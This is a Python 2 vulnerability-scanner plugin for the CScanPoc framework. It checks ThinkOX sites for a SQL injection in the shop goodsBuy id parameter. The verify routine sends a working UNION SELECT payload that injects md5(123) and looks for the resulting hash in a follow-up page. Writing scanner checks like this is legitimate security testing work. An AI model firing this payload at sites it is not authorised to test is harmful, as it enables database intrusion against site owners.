# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = 'c00849d7-6027-469c-b3ea-d5f885820c3d'
    name = 'ThinkOX SQL 注入漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-04-10'  # 漏洞公布时间
    desc = '''
        /Application/Shop/Controller/IndexController.class.php,商品的id未经过过滤，并且用拼接的方式带入where查询，导致注入。
    ''' # 漏洞描述
    ref = 'http://0day5.com/archives/3103/' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'ThinkOX'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5e5485ce-443e-45f9-9270-c59f06bc22a0'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url1 = '{target}'.format(target=self.target)+'/index.php?s=/shop/index/goodsBuy/name/%E5%95%8A/address/a/zipcode/123456/phone/13322222222/id/1)union%20select%201,md5(123),3,4,5,-9999,7,8,9,10,11,12,13%23.html'
            code,head,body,errcode,fina_url=hh.http(url1)
            url2 = '{target}'.format(target=self.target)+'/index.php?s=/usercenter/public/getinformation.html'
            code,head,body,errcode,fina_url=hh.http(url2)
                       
            if code == 200 and '202cb962ac59075b964b07152d234b70' in body :
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()